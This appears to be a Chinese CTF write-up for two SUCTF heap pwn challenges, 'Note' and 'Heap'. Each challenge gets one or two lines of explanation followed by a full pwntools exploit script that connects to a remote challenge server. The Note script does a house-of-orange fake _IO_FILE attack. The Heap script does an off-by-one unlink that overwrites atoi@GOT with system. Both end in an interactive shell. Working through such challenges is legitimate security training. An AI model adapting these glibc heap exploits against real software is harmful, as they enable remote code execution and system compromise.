# Note

典型的house-of-orange

先调用Pandora函数把0号和1号堆free

再调用show显示0号堆以此泄露libc

此时存在一块unsorted bin了，又因为add函数中可以往堆中进行越界写，直接构造file_io结构

exp:
	
	# coding:utf-8
	#!/usr/bin/env python2
	import copy
	from ctypes import *
	from pwn import *
	elf = ELF('./note')
	LOCAL = 0
	if LOCAL:
		libc = ELF("./libc-2.24.so")
		p = process('./note',env={"LD_PRELOAD":"./libc-2.24.so"})
		context.log_level = 'debug'
	else:
		libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')
		p = remote('pwn.suctf.asuri.org',20003)#47.104.16.75 8997
	#    context.log_level = 'debug'
	
	def z(a=''):
		gdb.attach(p,a)
		if a == '':
			raw_input()
	
	def menu(index):
		p.recvuntil('Choice>>')
		p.sendline(str(index))
	
	def Add(size,Content):
		menu(1)
		p.recvuntil('Size:')
		p.sendline(str(size))
		p.recvuntil('Content:')
		p.sendline(Content)
	
	def Show(index):
		menu(2)
		p.recvuntil('Index:')
		p.sendline(str(index))
	
	def Pandora():
		menu(3)
		p.recvuntil('This is a Pandora box,are you sure to open it?(yes:1)')
		p.sendline(str(1))
	
	Add(0x88,'aaaaaaaa')
	Pandora()
	Show(0)
	p.recvuntil('Content:')
	data = u64(p.recv(6).ljust(8,'\x00'))
	print 'data:' + hex(data)
	off = 0x7f0373c4eb78 - 0x7f0373c4eb10
	libc_base = data - off - libc.symbols['__malloc_hook']
	print 'libc_base:' + hex(libc_base)
	
	system = libc_base + libc.symbols['system']
	binsh = libc_base + libc.search('/bin/sh\x00').next()
	print 'off:' + hex(libc.symbols['_IO_file_jumps'] + (0x7f3219d1d4c0 -  0x7f3219d1d400))
	
	
	_IO_str_jumps = libc.symbols['_IO_file_jumps'] + (0x7f3219d1d4c0 -  0x7f3219d1d400) + libc_base
	_IO_list_all = libc_base + libc.symbols['_IO_list_all']
	print 'system:' + hex(system)
	print 'binsh:' + hex(binsh)
	print '_IO_str_jumps:' + hex(_IO_str_jumps)
	print '_IO_list_all:' + hex(_IO_list_all)
	
	
	from FILE import *
	context.arch = 'amd64'
	
	payload = 'a'*0x80
	fake_file = IO_FILE_plus_struct()
	fake_file._flags = 0
	fake_file._IO_read_ptr = 0x61
	fake_file._IO_read_base =_IO_list_all - 0x10
	fake_file._IO_write_base = 0
	fake_file._IO_write_ptr = 0x7fffffffffffffff
	fake_file._IO_buf_base = 0
	fake_file._IO_buf_end = (binsh-100)/2
	fake_file._mode = 0
	fake_file.vtable =_IO_str_jumps
	payload += str(fake_file).ljust(0xe0,'\x00')+p64(system)
	
	Add(0x80, payload)
	p.interactive()

# Heap

基础的off-by-one

直接unlink,再泄露libc,再改写atoi@got为system即可

exp:

	# coding:utf-8
	#!/usr/bin/env python2
	import copy
	from ctypes import *
	from pwn import *
	elf = ELF('./offbyone')
	libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
	LOCAL = 0
	if LOCAL:
	    p = process('./offbyone')#,env={"LD_PRELOAD":"./libc-2.24.so"})
	    context.log_level = 'debug'
	else:
	    p = remote('pwn.suctf.asuri.org',20004)#47.104.16.75 8997
	#    context.log_level = 'debug'
	
	def z(a=''):
		gdb.attach(p,a)
		if a == '':
			raw_input()
	
	def menu(id):
		p.recvuntil('4:edit\n')
		p.sendline(str(id))
	
	def Alloc(size,content):
		menu(1)
		p.recvuntil('input len\n')
		p.sendline(str(size))
		p.recvuntil('input your data\n')
		p.send(content)
	
	def Show(index):
		menu(3)
		p.recvuntil('input id\n')
		p.sendline(str(index))
	
	def Delete(index):
		menu(2)
		p.recvuntil('input id\n')
		p.sendline(str(index))
	
	def Edit(index,content):
		menu(4)
		p.recvuntil('input id\n')
		p.sendline(str(index))
		p.recvuntil('input your data\n')
		p.send(content)
	
	Alloc(0xf0,'a'*0xf0)#0
	Alloc(0xf0,'a'*10)#1
	Alloc(0xf0,'a'*10)#2
	Alloc(0xf0,'a'*10)#3
	Alloc(0xf0,'a'*0xf0)#4
	Alloc(0x80,'a'*0x80)#5
	Alloc(0x80,'a'*0x80)#6
	
	Delete(3)
	
	Alloc(0xf8,'a'*0xf8)#3
	
	data = p64(0) + p64(0xf0) + p64(0x6020D8 - 0x18) + p64(0x6020D8 - 0x10)
	data = data.ljust(0xf0)
	data += p64(0xf0)  + '\x00'
	Edit(3,data)
	
	Delete(4)
	
	Edit(3,'\x68\x20\x60\x00')
	
	Show(0)
	
	data = u64(p.recv(6).ljust(8,'\x00'))
	print 'atoi_addr:' + hex(data)
	
	libc_base = data - libc.symbols['atoi']
	system_addr = libc_base + libc.symbols['system']
	print 'system_addr:' + hex(system_addr)
	print p64(system_addr)[0:6]
	Edit(0,p64(system_addr)[0:6])
	
	p.interactive()

